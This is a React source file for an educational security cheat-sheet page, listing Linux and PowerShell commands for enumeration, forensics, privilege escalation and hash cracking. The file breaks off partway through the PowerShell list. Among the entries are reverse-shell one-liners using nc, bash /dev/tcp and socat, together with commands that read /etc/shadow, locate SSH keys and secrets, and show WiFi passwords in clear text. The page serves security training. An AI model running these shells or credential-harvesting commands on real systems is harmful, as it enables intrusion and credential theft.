import {
  Box,
  Typography,
  Container,
  Paper,
  alpha,
  useTheme,
  IconButton,
  Chip,
  Grid,
  Tabs,
  Tab,
  TextField,
  InputAdornment,
  Table,
  TableBody,
  TableCell,
  TableContainer,
  TableHead,
  TableRow,
  Tooltip,
  Divider,
  Alert,
  Card,
  CardContent,
  Button,
  Collapse,
  Badge,
  List,
  ListItem,
  ListItemIcon,
  ListItemText,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  ToggleButton,
  ToggleButtonGroup,
  LinearProgress,
  Snackbar,
} from "@mui/material";
import { useState, useMemo, useCallback } from "react";
import { useNavigate, Link } from "react-router-dom";
import ArrowBackIcon from "@mui/icons-material/ArrowBack";
import SearchIcon from "@mui/icons-material/Search";
import ContentCopyIcon from "@mui/icons-material/ContentCopy";
import CheckIcon from "@mui/icons-material/Check";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
import BookmarkIcon from "@mui/icons-material/Bookmark";
import BookmarkBorderIcon from "@mui/icons-material/BookmarkBorder";
import StarIcon from "@mui/icons-material/Star";
import WarningIcon from "@mui/icons-material/Warning";
import SecurityIcon from "@mui/icons-material/Security";
import TerminalIcon from "@mui/icons-material/Terminal";
import ViewListIcon from "@mui/icons-material/ViewList";
import ViewModuleIcon from "@mui/icons-material/ViewModule";
import FilterListIcon from "@mui/icons-material/FilterList";
import SchoolIcon from "@mui/icons-material/School";
import BugReportIcon from "@mui/icons-material/BugReport";
import SpeedIcon from "@mui/icons-material/Speed";
import HttpIcon from "@mui/icons-material/Http";
import StorageIcon from "@mui/icons-material/Storage";
import LockIcon from "@mui/icons-material/Lock";
import VpnKeyIcon from "@mui/icons-material/VpnKey";
import NetworkCheckIcon from "@mui/icons-material/NetworkCheck";
import CodeIcon from "@mui/icons-material/Code";
import DownloadIcon from "@mui/icons-material/Download";
import PlayArrowIcon from "@mui/icons-material/PlayArrow";
import InfoIcon from "@mui/icons-material/Info";
import LearnPageLayout from "../components/LearnPageLayout";

// Page context for AI chat
const pageContext = `This is an enhanced Security Commands Reference page containing 350+ essential commands for security professionals organized into 8 main categories:

1. Linux/Bash Commands (60+ commands):
- File Operations (ls, find, grep, cat, strings, file, xxd, binwalk)
- Network (netstat, ss, ip, nmap, tcpdump, curl, wget, netcat, socat)
- Process & System (ps, top, uname, crontab, systemctl, journalctl)
- Privilege Escalation (sudo -l, id, getcap, history, linpeas techniques)
- Hash & Crypto (md5sum, sha256sum, hashcat, john, openssl, gpg)
- Persistence & Backdoors (cron, systemd services, authorized_keys)
- Log Analysis (journalctl, /var/log, grep patterns, awk/sed)

2. PowerShell Commands (55+ commands):
- File Operations (Get-ChildItem, Get-Content, Select-String, Get-FileHash)
- Network (Get-NetTCPConnection, Test-NetConnection, Invoke-WebRequest)
- Process & System (Get-Process, Get-Service, Get-ComputerInfo, Get-ScheduledTask)
- Active Directory (Get-ADUser, Get-ADGroup, Get-ADComputer, Get-ADDomain, DCSync)
- Privilege & Security (whoami /all, net user, Get-LocalUser, token manipulation)
- Execution & Bypass (Set-ExecutionPolicy, AMSI bypass, download cradles)
- Credential Harvesting (mimikatz, lsass, SAM, credential manager)

3. Wireshark Filters (45+ filters):
- Protocol Filters (http, dns, tcp, udp, tls, smb, ssh, ftp, rdp)
- IP & Port Filters (ip.addr, tcp.port, src/dst filters, subnets)
- HTTP Analysis (request methods, response codes, hosts, URIs, cookies)
- Security Analysis (SYN scans, DNS queries, malware indicators, C2)
- TLS/SSL Analysis (handshakes, certificates, cipher suites)
- Compound Filters (combining multiple conditions, exclusions)

4. Nmap Commands (75+ commands):
- Host Discovery (-sn, -Pn, -PS, -PA, -PU, -PE, -PR, -sL)
- Port Scanning Techniques (-sS, -sT, -sU, -sA, -sN, -sF, -sX, -sI)
- Port Specification (-p, --top-ports, -F, port ranges)
- Service & Version Detection (-sV, -A, -O, --version-intensity)
- NSE Scripts (--script=vuln, safe, exploit, auth, brute, discovery)
- Timing & Performance (-T0 to -T5, --min-rate, --max-rate, --host-timeout)
- Output Formats (-oN, -oX, -oG, -oA, -v, --open, --reason)
- Firewall/IDS Evasion (-f, -D, -S, -g, --data-length, --spoof-mac)

5. Metasploit Commands (40+ commands):
- Core Commands (msfconsole, search, use, info, options, set)
- Exploitation (exploit, run, background, sessions)
- Post-Exploitation (migrate, getsystem, hashdump, kiwi)
- Payload Generation (msfvenom, encoders, formats)
- Auxiliary Modules (scanners, fuzzers, sniffers)

6. Web Testing Commands (35+ commands):
- Directory Enumeration (gobuster, dirsearch, ffuf, wfuzz)
- SQL Injection (sqlmap, manual techniques)
- XSS & SSRF Testing (curl, httpie, specialized tools)
- API Testing (curl, jwt_tool, API fuzzing)
- SSL/TLS Testing (testssl.sh, sslscan, sslyze)

7. Password Attacks (25+ commands):
- Hash Cracking (hashcat, john, ophcrack)
- Password Spraying (hydra, crackmapexec, kerbrute)
- Wordlist Tools (cewl, crunch, cupp)
- Hash Identification (hashid, hash-identifier)

8. Forensics & Incident Response (30+ commands):
- Memory Analysis (volatility, rekall)
- Disk Forensics (autopsy, sleuthkit, dc3dd)
- Network Forensics (tcpdump, tshark, zeek)
- Log Analysis (grep, awk, jq, timeline analysis)
- Malware Analysis (strings, file, objdump, radare2)

Features include:
- Bookmark favorite commands for quick access
- Filter by difficulty level (Beginner/Intermediate/Advanced)
- Export commands to text file
- Risk indicators for dangerous commands
- Interactive examples with copy-to-clipboard
- Category-based navigation with command counts
- Search across all categories simultaneously`;

interface TabPanelProps {
  children?: React.ReactNode;
  index: number;
  value: number;
}

function TabPanel({ children, value, index }: TabPanelProps) {
  return (
    <div hidden={value !== index}>
      {value === index && <Box sx={{ py: 3 }}>{children}</Box>}
    </div>
  );
}

interface Command {
  command: string;
  description: string;
  category: string;
  example?: string;
  difficulty?: "beginner" | "intermediate" | "advanced";
  dangerous?: boolean;
  tags?: string[];
  output?: string;
}

const linuxCommands: Command[] = [
  // File Operations
  { command: "ls -la", description: "List all files including hidden, with detailed permissions", category: "File Operations", example: "ls -la /var/log", difficulty: "beginner", tags: ["recon", "enumeration"] },
  { command: "ls -laR /home", description: "Recursively list all home directories", category: "File Operations", difficulty: "beginner" },
  { command: "find / -name '*.log' 2>/dev/null", description: "Find all log files, suppress permission errors", category: "File Operations", difficulty: "beginner" },
  { command: "find / -perm -4000 2>/dev/null", description: "Find SUID binaries (privilege escalation)", category: "File Operations", difficulty: "intermediate", tags: ["privesc"] },
  { command: "find / -perm -2000 2>/dev/null", description: "Find SGID binaries", category: "File Operations", difficulty: "intermediate", tags: ["privesc"] },
  { command: "find / -writable -type d 2>/dev/null", description: "Find world-writable directories", category: "File Operations", difficulty: "intermediate", tags: ["privesc"] },
  { command: "find / -name authorized_keys 2>/dev/null", description: "Find SSH authorized_keys files", category: "File Operations", difficulty: "intermediate", tags: ["persistence"] },
  { command: "find / -name id_rsa 2>/dev/null", description: "Find SSH private keys", category: "File Operations", difficulty: "intermediate", tags: ["credentials"] },
  { command: "find / -name '*.conf' -exec grep -l password {} \\; 2>/dev/null", description: "Find config files containing passwords", category: "File Operations", difficulty: "intermediate", tags: ["credentials"] },
  { command: "grep -r 'password' /etc 2>/dev/null", description: "Recursively search for 'password' in /etc", category: "File Operations", difficulty: "beginner" },
  { command: "grep -rn 'api_key\\|apikey\\|secret' . 2>/dev/null", description: "Search for API keys and secrets in current directory", category: "File Operations", difficulty: "intermediate", tags: ["credentials"] },
  { command: "cat /etc/passwd", description: "View user accounts on the system", category: "File Operations", difficulty: "beginner" },
  { command: "cat /etc/shadow", description: "View password hashes (requires root)", category: "File Operations", difficulty: "intermediate", dangerous: true, tags: ["credentials"] },
  { command: "cat /etc/group", description: "View groups and their members", category: "File Operations", difficulty: "beginner" },
  { command: "strings <binary>", description: "Extract readable strings from binary files", category: "File Operations", difficulty: "beginner", tags: ["reversing"] },
  { command: "strings -n 8 <binary> | grep -i pass", description: "Find password-related strings 8+ chars", category: "File Operations", difficulty: "intermediate" },
  { command: "file <filename>", description: "Determine file type", category: "File Operations", difficulty: "beginner" },
  { command: "xxd <file> | head -50", description: "Hex dump of file (first 50 lines)", category: "File Operations", difficulty: "intermediate", tags: ["reversing"] },
  { command: "binwalk <file>", description: "Analyze and extract embedded files", category: "File Operations", difficulty: "intermediate", tags: ["forensics", "reversing"] },
  { command: "stat <file>", description: "Display file timestamps and metadata", category: "File Operations", difficulty: "beginner", tags: ["forensics"] },
  { command: "lsattr <file>", description: "List file attributes (immutable, append-only)", category: "File Operations", difficulty: "intermediate" },
  
  // Network
  { command: "netstat -tulpn", description: "Show listening ports with process IDs", category: "Network", example: "sudo netstat -tulpn", difficulty: "beginner", tags: ["enumeration"] },
  { command: "netstat -antp", description: "All TCP connections with process names", category: "Network", difficulty: "beginner" },
  { command: "ss -tulpn", description: "Modern replacement for netstat", category: "Network", difficulty: "beginner" },
  { command: "ss -s", description: "Socket statistics summary", category: "Network", difficulty: "beginner" },
  { command: "ip a", description: "Show all network interfaces and IPs", category: "Network", difficulty: "beginner" },
  { command: "ip route", description: "Show routing table", category: "Network", difficulty: "beginner" },
  { command: "ip neigh", description: "Show ARP table (neighbors)", category: "Network", difficulty: "beginner" },
  { command: "arp -a", description: "Display ARP cache", category: "Network", difficulty: "beginner" },
  { command: "cat /etc/resolv.conf", description: "View DNS servers", category: "Network", difficulty: "beginner" },
  { command: "cat /etc/hosts", description: "View hosts file entries", category: "Network", difficulty: "beginner" },
  { command: "nmap -sV -sC <target>", description: "Service version detection with default scripts", category: "Network", difficulty: "intermediate" },
  { command: "nmap -p- -T4 <target>", description: "Fast scan all 65535 ports", category: "Network", difficulty: "intermediate" },
  { command: "tcpdump -i eth0 -w capture.pcap", description: "Capture network traffic to file", category: "Network", difficulty: "intermediate", tags: ["forensics"] },
  { command: "tcpdump -i any port 80 -A", description: "Capture HTTP traffic in ASCII", category: "Network", difficulty: "intermediate" },
  { command: "tcpdump -i eth0 'tcp[tcpflags] & (tcp-syn) != 0'", description: "Capture only SYN packets (scan detection)", category: "Network", difficulty: "advanced" },
  { command: "curl -I <url>", description: "Fetch HTTP headers only", category: "Network", difficulty: "beginner" },
  { command: "curl -k -X POST -d 'data' <url>", description: "POST data, ignore SSL errors", category: "Network", difficulty: "intermediate" },
  { command: "curl -s -o /dev/null -w '%{http_code}' <url>", description: "Get only HTTP status code", category: "Network", difficulty: "intermediate" },
  { command: "wget -r -np <url>", description: "Recursively download website", category: "Network", difficulty: "beginner" },
  { command: "wget --spider -r -l 2 <url> 2>&1 | grep '^--'", description: "Spider website and list URLs", category: "Network", difficulty: "intermediate" },
  { command: "nc -lvnp 4444", description: "Start netcat listener on port 4444", category: "Network", difficulty: "intermediate", tags: ["shells"] },
  { command: "nc -e /bin/bash <ip> <port>", description: "Reverse shell to attacker", category: "Network", difficulty: "intermediate", dangerous: true, tags: ["shells"] },
  { command: "nc -nv <ip> <port>", description: "Connect to remote port", category: "Network", difficulty: "beginner" },
  { command: "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash", description: "Socat reverse shell listener", category: "Network", difficulty: "advanced", tags: ["shells"] },
  { command: "bash -i >& /dev/tcp/<ip>/<port> 0>&1", description: "Bash reverse shell (no netcat needed)", category: "Network", difficulty: "intermediate", dangerous: true, tags: ["shells"] },
  { command: "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'", description: "Upgrade to interactive PTY shell", category: "Network", difficulty: "intermediate", tags: ["shells"] },
  
  // Process & System
  { command: "ps aux", description: "List all running processes with details", category: "Process & System", difficulty: "beginner", tags: ["enumeration"] },
  { command: "ps aux | grep root", description: "List processes running as root", category: "Process & System", difficulty: "beginner" },
  { command: "ps -ef --forest", description: "Process tree view", category: "Process & System", difficulty: "beginner" },
  { command: "top -n 1 -b", description: "One-time batch snapshot of processes", category: "Process & System", difficulty: "beginner" },
  { command: "htop", description: "Interactive process viewer", category: "Process & System", difficulty: "beginner" },
  { command: "pstree -p", description: "Process tree with PIDs", category: "Process & System", difficulty: "beginner" },
  { command: "lsof -i", description: "List open network files/connections", category: "Process & System", difficulty: "intermediate" },
  { command: "lsof -p <pid>", description: "Files opened by specific process", category: "Process & System", difficulty: "intermediate" },
  { command: "lsof +D /directory", description: "Find processes using a directory", category: "Process & System", difficulty: "intermediate" },
  { command: "uname -a", description: "System information (kernel version, arch)", category: "Process & System", difficulty: "beginner", tags: ["enumeration"] },
  { command: "cat /etc/os-release", description: "Distribution information", category: "Process & System", difficulty: "beginner" },
  { command: "hostnamectl", description: "System hostname and OS info", category: "Process & System", difficulty: "beginner" },
  { command: "df -h", description: "Disk space usage", category: "Process & System", difficulty: "beginner" },
  { command: "mount", description: "Show mounted filesystems", category: "Process & System", difficulty: "beginner" },
  { command: "cat /proc/version", description: "Kernel version and compiler info", category: "Process & System", difficulty: "beginner" },
  { command: "dmesg | tail -50", description: "Last 50 kernel messages", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
  { command: "last -a", description: "Last logged in users", category: "Process & System", difficulty: "beginner", tags: ["forensics"] },
  { command: "lastlog", description: "Last login of all users", category: "Process & System", difficulty: "beginner", tags: ["forensics"] },
  { command: "who -a", description: "Who is logged in with details", category: "Process & System", difficulty: "beginner" },
  { command: "w", description: "Who is logged in and what they're doing", category: "Process & System", difficulty: "beginner" },
  
  // Cron & Scheduled Tasks
  { command: "crontab -l", description: "List scheduled cron jobs for current user", category: "Cron & Scheduled Tasks", difficulty: "beginner", tags: ["persistence", "privesc"] },
  { command: "cat /etc/crontab", description: "View system-wide cron jobs", category: "Cron & Scheduled Tasks", difficulty: "beginner" },
  { command: "ls -la /etc/cron.*", description: "List all cron directories", category: "Cron & Scheduled Tasks", difficulty: "beginner" },
  { command: "cat /var/spool/cron/crontabs/*", description: "View all user crontabs (requires root)", category: "Cron & Scheduled Tasks", difficulty: "intermediate" },
  { command: "systemctl list-timers --all", description: "List all systemd timers", category: "Cron & Scheduled Tasks", difficulty: "intermediate" },
  { command: "atq", description: "List pending at jobs", category: "Cron & Scheduled Tasks", difficulty: "beginner" },
  
  // Services
  { command: "systemctl list-units --type=service", description: "List all services", category: "Services", difficulty: "beginner" },
  { command: "systemctl list-units --type=service --state=running", description: "List only running services", category: "Services", difficulty: "beginner" },
  { command: "systemctl status <service>", description: "Check service status", category: "Services", difficulty: "beginner" },
  { command: "journalctl -u <service> -n 100", description: "View last 100 log lines for service", category: "Services", difficulty: "intermediate", tags: ["forensics"] },
  { command: "journalctl --since '1 hour ago'", description: "View logs from last hour", category: "Services", difficulty: "intermediate" },
  { command: "service --status-all", description: "List all services (SysV init)", category: "Services", difficulty: "beginner" },
  
  // Privilege Escalation
  { command: "sudo -l", description: "List sudo privileges for current user", category: "Privilege Escalation", difficulty: "beginner", tags: ["privesc"] },
  { command: "sudo -V", description: "Check sudo version (for CVE checks)", category: "Privilege Escalation", difficulty: "intermediate", tags: ["privesc"] },
  { command: "id", description: "Show current user ID and group memberships", category: "Privilege Escalation", difficulty: "beginner" },
  { command: "whoami", description: "Show current username", category: "Privilege Escalation", difficulty: "beginner" },
  { command: "groups", description: "Show groups current user belongs to", category: "Privilege Escalation", difficulty: "beginner" },
  { command: "getcap -r / 2>/dev/null", description: "Find files with capabilities set", category: "Privilege Escalation", difficulty: "intermediate", tags: ["privesc"] },
  { command: "cat /etc/sudoers", description: "View sudo configuration (requires root)", category: "Privilege Escalation", difficulty: "intermediate", dangerous: true },
  { command: "env", description: "Show environment variables", category: "Privilege Escalation", difficulty: "beginner" },
  { command: "echo $PATH", description: "Show PATH variable (check for writable dirs)", category: "Privilege Escalation", difficulty: "beginner", tags: ["privesc"] },
  { command: "history", description: "View command history (may contain credentials)", category: "Privilege Escalation", difficulty: "beginner", tags: ["credentials"] },
  { command: "cat ~/.bash_history", description: "Read bash history file directly", category: "Privilege Escalation", difficulty: "beginner", tags: ["credentials"] },
  { command: "cat /proc/1/cgroup", description: "Check if running in container", category: "Privilege Escalation", difficulty: "intermediate" },
  { command: "ls -la /dev/disk/by-id/", description: "List disks (check if VM)", category: "Privilege Escalation", difficulty: "intermediate" },
  
  // Hash & Crypto
  { command: "md5sum <file>", description: "Calculate MD5 hash of file", category: "Hash & Crypto", difficulty: "beginner" },
  { command: "sha256sum <file>", description: "Calculate SHA-256 hash of file", category: "Hash & Crypto", difficulty: "beginner" },
  { command: "sha1sum <file>", description: "Calculate SHA-1 hash of file", category: "Hash & Crypto", difficulty: "beginner" },
  { command: "hashcat -m 0 hash.txt wordlist.txt", description: "Crack MD5 hashes with wordlist", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
  { command: "hashcat -m 1000 hash.txt wordlist.txt", description: "Crack NTLM hashes", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
  { command: "hashcat -m 1800 hash.txt wordlist.txt", description: "Crack SHA512crypt (Linux)", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
  { command: "hashcat -a 3 -m 0 hash.txt ?a?a?a?a?a?a", description: "Brute force MD5 (6 char all)", category: "Hash & Crypto", difficulty: "advanced", tags: ["password"] },
  { command: "john --wordlist=rockyou.txt hash.txt", description: "Crack hashes with John the Ripper", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
  { command: "john --format=NT hash.txt", description: "Crack NTLM with John", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
  { command: "john --show hash.txt", description: "Show cracked passwords", category: "Hash & Crypto", difficulty: "beginner" },
  { command: "unshadow /etc/passwd /etc/shadow > combined.txt", description: "Combine passwd and shadow for cracking", category: "Hash & Crypto", difficulty: "intermediate", tags: ["password"] },
  { command: "openssl enc -aes-256-cbc -d -in encrypted", description: "Decrypt AES-256 encrypted file", category: "Hash & Crypto", difficulty: "intermediate" },
  { command: "openssl s_client -connect <host>:443", description: "Test SSL/TLS connection", category: "Hash & Crypto", difficulty: "intermediate" },
  { command: "openssl x509 -in cert.pem -text -noout", description: "View certificate details", category: "Hash & Crypto", difficulty: "intermediate" },
  { command: "gpg -d <file.gpg>", description: "Decrypt GPG encrypted file", category: "Hash & Crypto", difficulty: "intermediate" },
  { command: "base64 -d <file>", description: "Decode Base64 file", category: "Hash & Crypto", difficulty: "beginner" },
  { command: "echo 'text' | base64", description: "Base64 encode text", category: "Hash & Crypto", difficulty: "beginner" },
  
  // Log Analysis
  { command: "journalctl -xe", description: "View recent logs with explanations", category: "Log Analysis", difficulty: "beginner", tags: ["forensics"] },
  { command: "journalctl -b -1", description: "View logs from previous boot", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
  { command: "cat /var/log/auth.log | grep -i 'failed'", description: "Find failed auth attempts", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
  { command: "cat /var/log/secure | grep -i 'accepted'", description: "Find successful SSH logins (RHEL)", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
  { command: "grep -r 'CRON' /var/log/syslog", description: "Find cron execution logs", category: "Log Analysis", difficulty: "intermediate", tags: ["forensics"] },
  { command: "tail -f /var/log/syslog", description: "Follow syslog in real-time", category: "Log Analysis", difficulty: "beginner" },
  { command: "zcat /var/log/*.gz | grep <pattern>", description: "Search compressed log files", category: "Log Analysis", difficulty: "intermediate" },
  { command: "ausearch -m USER_AUTH --start recent", description: "Search audit logs for auth events", category: "Log Analysis", difficulty: "advanced", tags: ["forensics"] },
];

const powershellCommands: Command[] = [
  // File Operations
  { command: "Get-ChildItem -Recurse -Force", description: "List all files including hidden, recursively", category: "File Operations", example: "gci -r -fo C:\\Users", difficulty: "beginner", tags: ["enumeration"] },
  { command: "Get-ChildItem -Recurse -Include *.txt,*.doc*,*.xls*", description: "Find document files recursively", category: "File Operations", difficulty: "beginner", tags: ["credentials"] },
  { command: "Get-Content <file>", description: "Display file contents (like cat)", category: "File Operations", difficulty: "beginner" },
  { command: "Get-Content <file> -Tail 50", description: "Display last 50 lines of file", category: "File Operations", difficulty: "beginner" },
  { command: "Select-String -Path *.txt -Pattern 'password'", description: "Search for pattern in files (like grep)", category: "File Operations", difficulty: "beginner", tags: ["credentials"] },
  { command: "Select-String -Path C:\\*.* -Pattern 'password' -Recurse", description: "Recursive password search", category: "File Operations", difficulty: "intermediate", tags: ["credentials"] },
  { command: "Get-FileHash <file> -Algorithm SHA256", description: "Calculate file hash", category: "File Operations", difficulty: "beginner" },
  { command: "icacls <file>", description: "Display file permissions", category: "File Operations", difficulty: "beginner" },
  { command: "Get-Acl <path> | Format-List", description: "Detailed ACL information", category: "File Operations", difficulty: "intermediate" },
  { command: "Get-ChildItem -Path C:\\ -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)}", description: "Files modified in last 7 days", category: "File Operations", difficulty: "intermediate", tags: ["forensics"] },
  { command: "Get-ChildItem -Path C:\\Users -Recurse -Include *.kdbx,*.key,*pass*,*cred* -ErrorAction SilentlyContinue", description: "Find password/credential files", category: "File Operations", difficulty: "intermediate", tags: ["credentials"] },
  { command: "[System.IO.File]::ReadAllBytes('<file>') | Format-Hex", description: "Hex dump of file", category: "File Operations", difficulty: "intermediate" },
  { command: "Get-Item -Path <file> | Select-Object *", description: "All file metadata", category: "File Operations", difficulty: "beginner" },
  
  // Network
  { command: "Get-NetTCPConnection", description: "Show active TCP connections", category: "Network", difficulty: "beginner", tags: ["enumeration"] },
  { command: "Get-NetTCPConnection | Where-Object State -eq 'Listen'", description: "Show listening ports only", category: "Network", difficulty: "beginner" },
  { command: "Get-NetTCPConnection -State Established | Select LocalAddress,LocalPort,RemoteAddress,RemotePort", description: "Established connections summary", category: "Network", difficulty: "intermediate" },
  { command: "Get-NetUDPEndpoint", description: "Show UDP endpoints", category: "Network", difficulty: "beginner" },
  { command: "Get-NetIPAddress", description: "Show IP addresses on all interfaces", category: "Network", difficulty: "beginner" },
  { command: "Get-NetIPConfiguration", description: "Network configuration summary", category: "Network", difficulty: "beginner" },
  { command: "Get-NetRoute", description: "Show routing table", category: "Network", difficulty: "beginner" },
  { command: "Get-NetNeighbor", description: "Show ARP cache", category: "Network", difficulty: "beginner" },
  { command: "Test-NetConnection -Port 443 <host>", description: "Test specific port connectivity", category: "Network", difficulty: "beginner" },
  { command: "Test-NetConnection <host> -TraceRoute", description: "Traceroute to host", category: "Network", difficulty: "beginner" },
  { command: "Invoke-WebRequest -Uri <url>", description: "HTTP request (like curl)", category: "Network", example: "iwr https://example.com", difficulty: "beginner" },
  { command: "Invoke-WebRequest -Uri <url> -Method POST -Body @{user='admin'}", description: "POST request with data", category: "Network", difficulty: "intermediate" },
  { command: "(Invoke-WebRequest -Uri <url>).Content", description: "Get response content only", category: "Network", difficulty: "beginner" },
  { command: "Resolve-DnsName <domain>", description: "DNS lookup", category: "Network", difficulty: "beginner" },
  { command: "Resolve-DnsName <domain> -Type MX", description: "DNS MX record lookup", category: "Network", difficulty: "beginner" },
  { command: "Get-NetFirewallRule | Where Enabled -eq True", description: "List enabled firewall rules", category: "Network", difficulty: "intermediate" },
  { command: "Get-NetFirewallRule | Where Action -eq 'Allow' | Select Name,Direction,LocalPort", description: "Allowed firewall rules summary", category: "Network", difficulty: "intermediate" },
  { command: "netsh wlan show profiles", description: "Show saved WiFi profiles", category: "Network", difficulty: "beginner", tags: ["credentials"] },
  { command: "netsh wlan show profile name='<SSID>' key=clear", description: "Show WiFi password in clear text", category: "Network", difficulty: "intermediate", tags: ["credentials"] },
  { command: "Get-DnsClientCache", description: "Show DNS cache", category: "Network", difficulty: "beginner" },
  
  // Process & System
  { command: "Get-Process", description: "List running processes", category: "Process & System", difficulty: "beginner", tags: ["enumeration"] },
  { command: "Get-Process | Sort-Object CPU -Descending | Select -First 10", description: "Top 10 CPU-consuming processes", category: "Process & System", difficulty: "beginner" },
  { command: "Get-Process | Where-Object {$_.Path -like '*temp*'}", description: "Processes running from temp folder", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
  { command: "Get-Service | Where Status -eq Running", description: "List running services", category: "Process & System", difficulty: "beginner" },
  { command: "Get-Service | Where StartType -eq Automatic", description: "Auto-start services", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
  { command: "Get-ComputerInfo", description: "Detailed system information", category: "Process & System", difficulty: "beginner" },
  { command: "Get-WmiObject Win32_OperatingSystem", description: "OS information via WMI", category: "Process & System", difficulty: "beginner" },
  { command: "Get-WmiObject Win32_ComputerSystem", description: "Computer system info (domain, etc)", category: "Process & System", difficulty: "beginner" },
  { command: "Get-ScheduledTask", description: "List scheduled tasks", category: "Process & System", difficulty: "beginner", tags: ["persistence"] },
  { command: "Get-ScheduledTask | Where State -eq 'Ready' | Get-ScheduledTaskInfo", description: "Scheduled tasks with last run info", category: "Process & System", difficulty: "intermediate" },
  { command: "Get-EventLog -LogName Security -Newest 50", description: "View recent security events", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
  { command: "Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} -MaxEvents 20", description: "Recent successful logins (4624)", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
  { command: "Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625} -MaxEvents 20", description: "Recent failed logins (4625)", category: "Process & System", difficulty: "intermediate", tags: ["forensics"] },
  { command: "Get-HotFix", description: "List installed updates/patches", category: "Process & System", difficulty: "beginner", tags: ["enumeration"] },
  { command: "Get-HotFix | Sort-Object InstalledOn -Descending | Select -First 10", description: "Most recent patches", category: "Process & System", difficulty: "beginner" },
  { command: "systeminfo", description: "Detailed system configuration", category: "Process & System", difficulty: "beginner" },
  { command: "Get-CimInstance Win32_StartupCommand", description: "List startup programs", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
  { command: "Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", description: "Registry Run key (persistence)", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
  { command: "Get-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", description: "User Run key (persistence)", category: "Process & System", difficulty: "intermediate", tags: ["persistence"] },
  
  // Active Directory
  { command: "Get-ADUser -Filter *", description: "List all AD users", category: "Active Directory", difficulty: "intermediate", tags: ["enumeration"] },
  { command: "Get-ADUser -Filter * -Properties *", description: "All users with all properties", category: "Active Directory", difficulty: "intermediate" },
  { command: "Get-ADUser -Filter {Enabled -eq $true} | Measure-Object", description: "Count enabled users", category: "Active Directory", difficulty: "beginner" },
  { command: "Get-ADUser -Filter * -Properties Description | Where Description -like '*pass*'", description: "Users with password in description", category: "Active Directory", difficulty: "intermediate", tags: ["credentials"] },
  { command: "Get-ADGroup -Filter *", description: "List all AD groups", category: "Active Directory", difficulty: "beginner" },
  { command: "Get-ADComputer -Filter *", description: "List all AD computers", category: "Active Directory", difficulty: "beginner" },
  { command: "Get-ADComputer -Filter {OperatingSystem -like '*Server*'}", description: "Find all servers", category: "Active Directory", difficulty: "intermediate" },
  { command: "Get-ADDomain", description: "Domain information", category: "Active Directory", difficulty: "beginner" },
  { command: "Get-ADDomainController -Filter *", description: "List domain controllers", category: "Active Directory", difficulty: "beginner" },
  { command: "Get-ADGroupMember -Identity 'Domain Admins'", description: "List Domain Admins", category: "Active Directory", difficulty: "beginner", tags: ["enumeration"] },
  { command: "Get-ADGroupMember -Identity 'Enterprise Admins'", description: "List Enterprise Admins", category: "Active Directory", difficulty: "beginner" },
  { command: "Get-ADGroupMember -Identity 'Administrators' -Recursive", description: "All admins recursively", category: "Active Directory", difficulty: "intermediate" },
  { command: "Get-ADUser -Filter {AdminCount -eq 1}", description: "Find privileged accounts", category: "Active Directory", difficulty: "intermediate" },
  { command: "Get-ADUser -Filter * -Properties ServicePrincipalName | Where ServicePrincipalName", description: "Users with SPN (Kerberoasting targets)", category: "Active Directory", difficulty: "advanced", tags: ["kerberoast"] },
  { command: "([adsisearcher]'objectCategory=User').FindAll()", description: "ADSI search for users (no module needed)", category: "Active Directory", difficulty: "intermediate" },
  { command: "Get-ADTrust -Filter *", description: "List domain trusts", category: "Active Directory", difficulty: "intermediate" },
  { command: "[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()", description: "Current domain info (no module)", category: "Active Directory", difficulty: "intermediate" },
  
  // Privilege & Security
  { command: "whoami /all", description: "Current user with all privileges and groups", category: "Privilege & Security", difficulty: "beginner", tags: ["enumeration"] },
  { command: "whoami /priv", description: "Current user privileges", category: "Privilege & Security", difficulty: "beginner" },
  { command: "whoami /groups", description: "Current user groups", category: "Privilege & Security", difficulty: "beginner" },
  { command: "net user", description: "List local users", category: "Privilege & Security", difficulty: "beginner" },
  { command: "net user <username>", description: "Details about specific user", category: "Privilege & Security", difficulty: "beginner" },
  { command: "net localgroup", description: "List local groups", category: "Privilege & Security", difficulty: "beginner" },
  { command: "net localgroup Administrators", description: "List local administrators", category: "Privilege & Security", difficulty: "beginner" },
  { command: "net accounts", description: "Password policy info", category: "Privilege & Security", difficulty: "beginner" },
  { command: "Get-LocalUser | Select Name,Enabled,LastLogon", description: "Local user details", category: "Privilege & Security", difficulty: "beginner" },
  { command: "Get-LocalGroupMember -Group 'Administrators'", description: "Local admin members", category: "Privilege & Security", difficulty: "beginner" },
  { command: "secedit /export /cfg sec.cfg", description: "Export security policy", category: "Privilege & Security", difficulty: "intermediate" },
  { command: "cmdkey /list", description: "List stored credentials", category: "Privilege & Security", difficulty: "beginner", tags: ["credentials"] },
  { command: "Get-ChildItem Cert:\\CurrentUser\\My", description: "List user certificates", category: "Privilege & Security", difficulty: "intermediate" },
  { command: "Get-ChildItem Cert:\\LocalMachine\\My", description: "List machine certificates", category: "Privilege & Security", difficulty: "intermediate" },
